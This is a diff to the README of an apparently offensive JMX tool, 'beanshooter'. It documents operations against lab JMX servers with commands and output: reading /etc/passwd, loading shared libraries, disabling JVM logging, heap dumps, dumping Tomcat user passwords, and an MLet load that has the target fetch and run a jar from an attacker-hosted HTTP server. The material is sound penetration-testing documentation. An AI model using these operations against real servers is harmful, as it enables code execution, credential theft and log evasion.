@@ -686,6 +686,296 @@ The undeploy action removes the specified *MBean* from a remote *JMX* service:
 ```
 
 
+### Diagnostic
+
+---
+
+The *DiagnosticCommandMBean* is a useful *MBean* that is ofted deployed by default on *JMX servers*.
+It implements several different methods that are interesting from an offensive perspective. Some of
+them are implemented as *beanshooter* operations. Others can of course be invoked manually.
+
+#### Diagnostic Read
+
+The `read` operation can be used to read textfiles on the *MBean* server. The operation uses the
+`addCompilerDirective` method to cause an exception that contains the contents of the specified
+text file:
+
+```console
+[qtc@devbox ~]$ beanshooter diagnostic read 172.17.0.2 1090 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+```
+
+This technique was originally implemented by [@TheLaluka](https://twitter.com/TheLaluka) within the
+[jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit).
+
+#### Diagnostic Load
+
+The `load` operation can be used to load a shared library from the file system of the *JMX server*:
+
+```console
+[qtc@devbox ~]$ beanshooter diagnostic load 172.17.0.2 1090 /lib/x86_64-linux-gnu/libc.so.6
+[+] The server complained about the missing function Agent_OnAttach
+[+] The specified library was loaded succesfully.
+```
+
+#### Diagnostic Logfile
+
+The `logfile` action can be used to change the logfile location of the *JVM*:
+
+```console
+[qtc@devbox ~]$ beanshooter diagnostic logfile 172.17.0.2 1090 /tmp/test.log
+[+] Logfile path was successfully set to /tmp/test.log
+```
+
+#### Diagnostic Nolog
+
+The `nolog` action can be used to disable logging (useful to close the logfile handle):
+
+```console
+[qtc@devbox ~]$ beanshooter diagnostic nolog 172.17.0.2 1090
+[+] Logging was disabled successfully.
+```
+
+#### Diagnostic Cmdline
+
+The `cmdline` action prints the cmdline the *JVM* was launched with:
+
+```console
+[qtc@devbox ~]$ beanshooter diagnostic cmdline 172.17.0.2 1090
+VM Arguments:
+jvm_args: --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp -Djava.rmi.server.hostname=iinsecure.dev -Djavax.net.ssl.keyStorePassword=password -Djavax.net.ssl.keyStore=/opt/store.p12 -Djavax.net.ssl.keyStoreType=pkcs12 -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.local.only=false -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.port=1090 -Dcom.sun.management.jmxremote.rmi.port=1099
+java_command: org.apache.catalina.startup.Bootstrap start
+java_class_path (initial): /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar
+Launcher Type: SUN_STANDARD
+```
+
+#### Diagnostic Props
+
+The `props` action prints a list of system properties:
+
+```console
+[qtc@devbox ~]$ beanshooter diagnostic props 172.17.0.2 1090
+#Mon Jul 25 19:17:52 UTC 2022
+com.sun.management.jmxremote.rmi.port=1099
+awt.toolkit=sun.awt.X11.XToolkit
+java.specification.version=11
+sun.cpu.isalist=
+...
+```
+
+
+### HotSpot
+
+---
+
+The *HotSpotDiagnosticMXBean* provides an interface for managing the *HotSpot Virtual Machine*
+and supports some methods that are useful from an offensive perspective.
+
+#### HotSpot dump
+
+The `dump` action creates a heapdump and saves it to an arbitrary location on the application server.
+The only requirement is, that the dump is saved as a file with the `.hprof` extension:
+
+```console
+[qtc@devbox ~]$ beanshooter hotspot dump 172.17.0.2 1090 /tmp/dump.hprof
+[+] Heapdump file /tmp/dump.hprof was created successfully.
+```
+
+#### HotSpot list
+
+The `list` action prints a list of available *Diagnostic Options* and their associated values:
+
+```console
+[qtc@devbox ~]$ beanshooter hotspot list 172.17.0.2 1090
+[+] HeapDumpBeforeFullGC (value = false, writable = true)
+[+] HeapDumpAfterFullGC (value = false, writable = true)
+[+] HeapDumpOnOutOfMemoryError (value = false, writable = true)
+[+] HeapDumpPath (value = , writable = true)
+...
+```
+
+#### HotSpot get
+
+The `get` action allows to obtain the value of the specified option:
+
+```console
+[qtc@devbox ~]$ beanshooter hotspot get 172.17.0.2 1090 HeapDumpBeforeFullGC
+[+] Name: HeapDumpBeforeFullGC
+[+] Value: false
+[+] Writable: true
+```
+
+#### HotSpot set
+
+The `set` action allows to set the value of the specified option:
+
+```console
+[qtc@devbox ~]$ beanshooter hotspot set 172.17.0.2 1090 HeapDumpBeforeFullGC true
+[+] Option was set successfully.
+[qtc@devbox ~]$ beanshooter hotspot get 172.17.0.2 1090 HeapDumpBeforeFullGC
+[+] Name: HeapDumpBeforeFullGC
+[+] Value: true
+[+] Writable: true
+```
+
+
+### MLet
+
+---
+
+The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
+network. It is already implicitly used by *beanshooters* `deploy` action, but can also be invoked
+manually using the `mlet` operation.
+
+#### MLet Load
+
+The currently only implemented *MLet* method is the `load` operation that can be used to load
+an *MBean* class from a user specified *URL*:
+
+```console
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000
+[+] Starting MBean deployment.
+[+]
+[+] 	Deplyoing MBean: MLet
+[+] 	MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+] Loading MBean from http://172.17.0.1:8000
+[+]
+[+] 	Creating HTTP server on: 172.17.0.1:8000
+[+] 		Creating MLetHandler for endpoint: /
+[+] 		Creating JarHandler for endpoint: /3584de270132420aaf0812366bc46035
+[+] 		Starting HTTP server... 
+[+] 		
+[+] 	Incoming request from: iinsecure.dev
+[+] 	Requested resource: /
+[+] 	Sending mlet:
+[+]
+[+] 		Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 		Archive:   3584de270132420aaf0812366bc46035
+[+] 		Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 		Codebase:  http://172.17.0.1:8000
+[+]
+[+] 	Incoming request from: iinsecure.dev
+[+] 	Requested resource: /3584de270132420aaf0812366bc46035
+[+] 	Sending jar file with md5sum: b2f7040f7d8f2d1f40b205d631ff7356
+[+]
+[+] MBean was loaded successfully.
+```
+
+The example above demonstrates how the *TonkaBean* can be manually loaded using the `mlet` operation. If
+you want to load a custom *MBean* instead, you need to specify the keyword `custom` instead of `tonka` and supply
+the `--class-name`, `--object-name` and `--jar-file` options:
+
+```console
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
+[+] Starting MBean deployment.
+[+] ...
+[+] MBean was loaded successfully.
+```
+
+
+### Recoder
+
+---
+
+The *FlightRecorderMXBean* provides an interface for managing the *Flight Recorder*
+and supports some methods that are interesting from an offensive prespective.
+
+#### Recoder new
+
+The `new` operation starts a new recording. The returned recording ID can be used as a target
+for other operations:
+
+```console
+[qtc@devbox ~]$ beanshooter recorder new 172.17.0.2 1090
+[+] Requesting new recording on the MBeanServer.
+[+] New recording created successfully with ID: 1
+```
+
+#### Recoder start
+
+The `start` action starts an already existing recording and expects the recording ID as an additional argument:
+
+```console
+[qtc@devbox ~]$ beanshooter recorder start 172.17.0.2 1090 1
+[+] Recording with ID 1 started successfully.
+```
+
+#### Recoder dump
+
+While an recording is active, its contents can be dumped using the `dump` action. This stores the recording
+information in a dump file on the *JMX server*:
+
+```console
+[qtc@devbox ~]$ beanshooter recorder dump 172.17.0.2 1090 1 /tmp/dump.dat
+[+] Recording with ID 1 was successfully dumped to /tmp/dump.dat
+```
+
+#### Recorder stop
+
+The `stop` action can be used to stop a recording:
+
+```console
+[qtc@devbox ~]$ beanshooter recorder stop 172.17.0.2 1090 1
+[+] Recording with ID 1 stopped successfully.
+```
+
+#### Recorder save
+
+After a recording was stopped, it can be saved using the `save` action. In contrast to the `dump` action,
+this saves the recording on the local machine instead on the application server.
+
+```console
+[qtc@devbox ~]$ beanshooter recorder save 172.17.0.2 1090 1 recording.dat
+[+] Saving recording with ID: 1
+[+] Writing recording data to: /home/qtc/recording.dat
+```
+
+
+### Tomcat
+
+---
+
+The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache tomcat*. This *MBean* provides access to user
+accounts that are available on a *tomcat* service.
+
+#### Tomcat List
+
+The currently only implemented operation is `list`, which lists available user accounts, their associated roles and credentials:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
+[+] Listing tomcat users:
+[+]
+[+] 	----------------------------------------
+[+] 	Username:  manager
+[+] 	Password:  P@55w0rD#
+[+] 	Roles:
+[+] 		   Users:type=Role,rolename="manager-gui",database=UserDatabase
+[+] 		   Users:type=Role,rolename="manager-script",database=UserDatabase
+[+] 		   Users:type=Role,rolename="manager-jmx",database=UserDatabase
+[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
+[+]
+[+] 	----------------------------------------
+[+] 	Username:  admin
+[+] 	Password:  s3cr3T!$
+[+] 	Roles:
+[+] 		   Users:type=Role,rolename="admin-gui",database=UserDatabase
+[+] 		   Users:type=Role,rolename="admin-script",database=UserDatabase
+[+]
+[+] 	----------------------------------------
+[+] 	Username:  status
+[+] 	Password:  cr@cKM3o.O
+[+] 	Roles:
+[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
+```
+
+
 ### Tonka
 
 ---
@@ -793,100 +1083,6 @@ The `download` action can be used to download a file from the *JMX* server:
 [qtc@devbox ~]$ beanshooter tonka download 172.17.0.2 9010 /etc/passwd
 [+] Saving remote file /etc/passwd to local path /home/qtc/passwd
 [+] 1172 bytes were written to /home/qtc/passwd
-```
-
-
-### MLet
-
----
-
-The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
-network. It is already implicitly used by *beanshooters* `deploy` action, but can also be invoked
-manually using the `mlet` operation.
-
-#### MLet Load
-
-The currently only implemented *MLet* method is the `load` operation that can be used to load
-an *MBean* class from a user specified *URL*:
-
-```console
-[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 tonka http://172.17.0.1:8000
-[+] Starting MBean deployment.
-[+]
-[+] 	Deplyoing MBean: MLet
-[+] 	MBean with object name DefaultDomain:type=MLet was successfully deployed.
-[+]
-[+] Loading MBean from http://172.17.0.1:8000
-[+]
-[+] 	Creating HTTP server on: 172.17.0.1:8000
-[+] 		Creating MLetHandler for endpoint: /
-[+] 		Creating JarHandler for endpoint: /3584de270132420aaf0812366bc46035
-[+] 		Starting HTTP server... 
-[+] 		
-[+] 	Incoming request from: iinsecure.dev
-[+] 	Requested resource: /
-[+] 	Sending mlet:
-[+]
-[+] 		Class:     de.qtc.beanshooter.tonkabean.TonkaBean
-[+] 		Archive:   3584de270132420aaf0812366bc46035
-[+] 		Object:    MLetTonkaBean:name=TonkaBean,id=1
-[+] 		Codebase:  http://172.17.0.1:8000
-[+]
-[+] 	Incoming request from: iinsecure.dev
-[+] 	Requested resource: /3584de270132420aaf0812366bc46035
-[+] 	Sending jar file with md5sum: b2f7040f7d8f2d1f40b205d631ff7356
-[+]
-[+] MBean was loaded successfully.
-```
-
-The example above demonstrates how the *TonkaBean* can be manually loaded using the `mlet` operation. If
-you want to load a custom *MBean* instead, you need to specify the keyword `custom` instead of `tonka` and supply
-the `--class-name`, `--object-name` and `--jar-file` options:
-
-```console
-[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
-[+] Starting MBean deployment.
-[+] ...
-[+] MBean was loaded successfully.
-```
-
-
-### Tomcat
-
----
-
-The `tomcat` operation interacts with the `MemoryUserDatabaseMBean` of *Apache tomcat*. This *MBean* provides access to user
-accounts that are available on a *tomcat* service.
-
-#### Tomcat List
-
-The currently only implemented operation is `list`, which lists available user accounts, their associated roles and credentials:
-
-```console
-[qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
-[+] Listing tomcat users:
-[+]
-[+] 	----------------------------------------
-[+] 	Username:  manager
-[+] 	Password:  P@55w0rD#
-[+] 	Roles:
-[+] 		   Users:type=Role,rolename="manager-gui",database=UserDatabase
-[+] 		   Users:type=Role,rolename="manager-script",database=UserDatabase
-[+] 		   Users:type=Role,rolename="manager-jmx",database=UserDatabase
-[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
-[+]
-[+] 	----------------------------------------
-[+] 	Username:  admin
-[+] 	Password:  s3cr3T!$
-[+] 	Roles:
-[+] 		   Users:type=Role,rolename="admin-gui",database=UserDatabase
-[+] 		   Users:type=Role,rolename="admin-script",database=UserDatabase
-[+]
-[+] 	----------------------------------------
-[+] 	Username:  status
-[+] 	Password:  cr@cKM3o.O
-[+] 	Roles:
-[+] 		   Users:type=Role,rolename="manager-status",database=UserDatabase
 ```
 
 
